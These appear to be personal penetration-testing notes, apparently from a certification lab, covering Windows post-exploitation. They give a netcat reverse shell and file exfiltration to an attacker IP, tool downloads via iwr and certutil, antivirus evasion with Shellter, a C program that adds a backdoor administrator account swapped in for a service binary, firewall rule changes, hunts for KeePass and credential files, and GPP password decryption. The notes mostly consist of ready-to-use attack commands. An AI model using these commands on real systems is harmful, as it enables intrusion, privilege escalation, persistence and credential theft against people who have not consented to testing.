## Misc Commands
**Compile an Executable from a C file**
`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

**File Retrieval**
```
On Attacker:
nc -lvp <port> > file-name-to-DL

On Victim:
cmd /c '.\nc.exe <attacker-ip> <listening-port> -w 3 < File-to-download'
```

**Connect back with Netcat**
```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```
## Powershell
**Enable powershell file execution**
`Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`

**Look for files with extension**
```
- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
- Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

**Find Local Accounts**
`Get-LocalUser`

**Downloading Files**
```
- iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
- wget http://192.168.0.1/file -O file.exe
- curl -o <URL>
- certutil.exe -urlcache -f <URL> <file-output-name>
- powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

**Run as Other User**
`runas /user:username cmd`

**Check Path Env Variable**
`$env:path`

**Check Kerberos Tickets**
`klist`
## CMD
**Check Account Details and Groups**
`net user <username>`

**Get Privileges**
`whoami /priv`

**Find program**
`where <program name>`

## Evading AV with Shellter
```
- Shellter is a dynamic shellcode injection tool
- Analyzes PE file + execution paths to find where it can inject code
- Just stick with auto, manual is granular/high skill
- Then point at an executable etc
- Choose shell type
- Executable is then transferred to the victim
```

## Situational Awareness
- ALWAYS find this out and write it down
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

```
- **whoami** for username
	- Also for hostname sometimes
		- Hostname can imply if its a client system or a server - e.g `MSSQL01` would be a MSSQL server whereas `clientwk220` would be client system
- **whoami /groups** for user groups
- **powershell** >> **Get-LocalUser** || net user
	- All local users
- **powershell >> Get-LocalGroup** || **net localgroup**
	- All groups
	- Get-LocalGroup *group_name* to view more details on a group
- **powershell >> get-localgroupmember *group_name***
	- get-localgroupmember administrators
	- List members of a group
- **systeminfo**
	- Get OS Name, Ver, System Type etc
- **ipconfig /all**
	- Networking information
- **route print**
	- Show routes to potentially unknown networks
- **netstat -ano**
	- show all active TCP connections
		- Shows stuff like listening web servers, MSQL servers etc
		- Check for established state for other processes - can exfil creds from other users
	- -a : all active tcp connections
	- -n disable name resolution
	- -o show PID for each connection
- Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
	- Check installed 32bit applications and 64bit
- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- **Get-Process**
	- Check running processes
```

**Check out Powershell History**
```
- Run Get-History
	- This is often cleared by admins. Also chck out if cached on PSReadline. This can be located with (Get-PSReadlineOption).HistorySavePath
```

**Find running services**
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
	- This needs an admin in WinRM/Bind Shell or RDP
	- Can be used for DLL injection
```

**Find Service Permissions**
```
- icacls "C:\xampp\apache\bin\httpd.exe"
- icacls "C:\xampp\mysql\bin\mysqld.exe"

If you find something with DOMAIN\Users:(F), you can replace it with another binary such as

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

Then after compiling:
- PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  
- PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
- PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

Then retart the service with: 
	- net stop <service-name>

If you can't restart the service, see if you can restart the system with SeShutDownPrivilege
	- whoami /priv
	- shutdown /r /y 0
```

**Find Service Paths**
```
	- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
	- Can be used for Unquoted Service paths
```
### PowerUp.ps1
```
Kills at Enum. Still gets things wrong sometimes
	- . .\PowerUp.ps1
	- Get-ModifiableServiceFile
```

**Poke hole in firwall as admin** 
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<victim IP> localport=2222 action=allow

netsh advfirewall firewall delete rule name="port_forward_ssh_2222
	- how to delete
```

**RDP in**
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
```

```
Old policy-backup files can have cpassword decrypted with:
- gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```